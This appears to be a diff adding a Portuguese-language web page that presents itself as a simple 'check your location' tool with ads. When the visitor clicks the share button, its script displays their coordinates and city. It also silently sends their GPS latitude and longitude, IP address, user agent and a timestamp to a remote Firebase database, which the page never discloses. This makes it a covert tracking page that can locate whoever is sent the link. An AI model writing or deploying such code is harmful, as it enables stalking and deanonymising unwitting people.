@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="google-adsense-account" content="ca-pub-3707008419271765">
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3707008419271765"
+crossorigin="anonymous"></script>
+
+<a class="voltar" href="index.html">← Voltar</a>
+<title>Localização</title>
+
+<style>
+
+body{
+font-family:Arial;
+background:#0f0f0f;
+color:white;
+text-align:center;
+padding-top:80px;
+}
+
+button{
+padding:18px 40px;
+font-size:20px;
+background:#1e88e5;
+color:white;
+border:none;
+border-radius:10px;
+cursor:pointer;
+}
+
+#info{
+margin-top:30px;
+font-size:18px;
+color:#00e676;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1>📍 Verificar localização</h1>
+<!-- ANUNCIO -->
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-3707008419271765"
+data-ad-slot="2879308857"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<button onclick="pegar()">Compartilhar localização</button>
+
+<div id="info"></div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDrtZxbKXk7hjlqBL_BLoZMTBdc5iqBCXo",
+authDomain: "ferramentas-projeto.firebaseapp.com",
+databaseURL: "https://ferramentas-projeto.firebaseio.com/",
+projectId: "ferramentas-projeto",
+storageBucket: "ferramentas-projeto.appspot.com",
+messagingSenderId: "877191590019",
+appId: "1:877191590019:web:152d4d35bdd3024c53abb6"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.pegar = function(){
+
+navigator.geolocation.getCurrentPosition(async function(pos){
+
+let lat = pos.coords.latitude;
+let lon = pos.coords.longitude;
+
+let ipinfo = await fetch("https://ipapi.co/json/");
+let dados = await ipinfo.json();
+
+let userAgent = navigator.userAgent;
+
+document.getElementById("info").innerHTML =
+"Latitude: "+lat+
+"<br>Longitude: "+lon+
+"<br>Cidade: "+dados.city+
+"<br>País: "+dados.country_name;
+
+push(ref(db,"localizacoes"),{
+
+latitude:lat,
+longitude:lon,
+cidade:dados.city,
+pais:dados.country_name,
+ip:dados.ip,
+celular:userAgent,
+data:Date.now()
+
+});
+
+});
+
+}
+
+</script>
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+apiKey: "AIzaSyDrtZxbKXk7hjlqBL_BLoZMTBdc5iqBCXo",
+authDomain: "ferramentas-projeto.firebaseapp.com",
+databaseURL: "https://ferramentas-projeto.firebaseio.com/",
+projectId: "ferramentas-projeto",
+storageBucket: "ferramentas-projeto.appspot.com",
+messagingSenderId: "877191590019",
+appId: "1:877191590019:web:152d4d35bdd3024c53abb6"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const ferramentaRef = ref(db,"ferramentas/localizacao");
+
+get(ferramentaRef).then((snapshot)=>{
+
+let uso = snapshot.val() || 0;
+uso++;
+
+set(ferramentaRef,uso);
+
+});
+
+</script>
+  
+</body>
+  </html>
